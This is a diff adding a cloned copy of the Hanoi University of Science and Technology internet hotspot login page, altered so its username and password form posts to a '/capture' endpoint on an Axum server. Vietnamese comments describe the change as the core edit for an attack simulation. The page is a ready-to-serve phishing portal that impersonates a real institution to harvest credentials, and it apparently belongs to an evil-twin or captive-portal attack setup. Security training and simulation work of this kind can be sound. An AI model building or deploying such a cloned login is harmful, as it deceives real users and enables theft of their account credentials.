@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<!-- saved from url=(0108)https://bknet134.hust.edu.vn/login?dst=http%3A%2F%2Fedge-http.microsoft.com%2Fcaptiveportal%2Fgenerate%5F204 -->
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta http-equiv="pragma" content="no-cache">
+    <meta http-equiv="expires" content="-1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Internet hotspot - Log in</title>
+    <link rel="stylesheet" href="style.css">
+    
+    <style>
+        /* Chuyển khối style vào head cho đúng chuẩn */
+
+        body {
+            /* Giữ lại background-color làm dự phòng */
+            background-color: #cccccc; /* Used if the image is unavailable */
+            /* height: 500px; You must set a specified height */
+
+            /* Bỏ các thuộc tính background-image khỏi body */
+            /* background-image: url('background.jpg'); */
+            /* background-position: center; */
+            /* background-repeat: no-repeat; */
+            /* background-size: cover; */
+
+            /* Đặt body ở vị trí tương đối và z-index dương */
+            /* để đảm bảo nội dung body nằm trên pseudo-element ảnh nền */
+            position: relative;
+            z-index: 1; /* Đảm bảo nội dung body nằm trên pseudo-element có z-index -1 */
+            
+            /* Thêm margin-top để phần nội dung không bị che bởi div header */
+            /* Bạn có thể cần điều chỉnh giá trị này */
+            /* margin-top: 60px; */ 
+        }
+
+        /* Tạo một pseudo-element cho body để đặt ảnh nền */
+        body::before {
+            content: ''; /* Cần có content cho pseudo-element hoạt động */
+            position: fixed; /* Đặt vị trí cố định để nó phủ toàn màn hình */
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            /* Hoặc dùng width: 100%; height: 100%; cho position: absolute; */
+
+            /* Đặt ảnh nền và các thuộc tính liên quan lên pseudo-element */
+            background-image: url('background.jpg'); /* Đảm bảo file này nằm trong content/img/ */
+            background-position: center; /* Center the image */
+            background-repeat: no-repeat; /* Do not repeat the image */
+            background-size: cover; /* Resize the background image to cover the entire container */
+
+            /* Áp dụng hiệu ứng xám lên pseudo-element (chính là ảnh nền) */
+            filter: grayscale(100%);
+
+            /* Đặt pseudo-element ở lớp thấp hơn (phía sau) nội dung body */
+            z-index: -1;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- two other colors
+
+<body class="lite">
+<body class="dark">
+
+-->
+<div style="height:60px;background-color:white;">
+    <!-- <img src="img/logo-bk.png" alt="[Image Missing]" height="70px"/> -->
+    <img src="logoEn.png" alt="[Image Missing]" height="60px"> <!-- Đảm bảo file này nằm trong content/ -->
+</div>
+
+    <!--  -->
+    <div class="ie-fixMinHeight">
+        <div class="main">
+            <div class="wrap animated fadeIn">
+                <!-- THAY ĐỔI CỐT LÕI TẠI ĐÂY: `action` trỏ đến endpoint của Axum server -->
+                <form name="login" action="/capture" method="post">
+                    <!-- Xóa các input ẩn không cần thiết cho mục đích mô phỏng tấn công của bạn -->
+                    <!-- <input type="hidden" name="dst" value="http://edge-http.microsoft.com/captiveportal/generate_204"> -->
+                    <!-- <input type="hidden" name="popup" value="true"> -->
+                    
+                    <div style="text-align:center;" class="container">              
+                        <img src="HUST.png" width="160px"> <!-- Đảm bảo file này nằm trong content/ -->
+                    </div>
+                    <!-- </svg> -->
+
+
+                    <p class="info ">
+                        Please log in to use the internet hotspot service 
+                        
+
+                        
+                    </p>
+                    <label>
+                        <img class="ico" src="user.svg" alt="#"> <!-- Đảm bảo file này nằm trong content/ -->
+                        <input name="username" type="text" value="" placeholder="Username">
+
+                     
+
+                    <label>
+                        <img class="ico" src="password.svg" alt="#"> <!-- Đảm bảo file này nằm trong content/ -->
+                        <input name="password" type="password" placeholder="Password">
+                    </label>
+
+                    <input type="submit" value="Connect">
+
+                
+                
+
+                </label></form></div>
+            </div>
+        </div>
+    
+     <div class="footer">
+	 <div style="margin-top: 10%; text-align: center; background: #9c1010; padding: 10px; color: #FFF;">
+            HANOI UNIVERSITY OF SCIENCE AND TECHNOLOGY <a href="https://hust.edu.vn/" target="_blank">https://hust.edu.vn</a>
+     </div>
+    <div style="height:60px; text-align: center;">
+        <p style="text-align: center; color: white;">Powered by </p>
+        <div><img src="HUST_logo.png" alt="[Image Missing]" width="60px"></div> <!-- Đảm bảo file này nằm trong content/ -->
+    </div>
+
+
+
+</div></body></html>
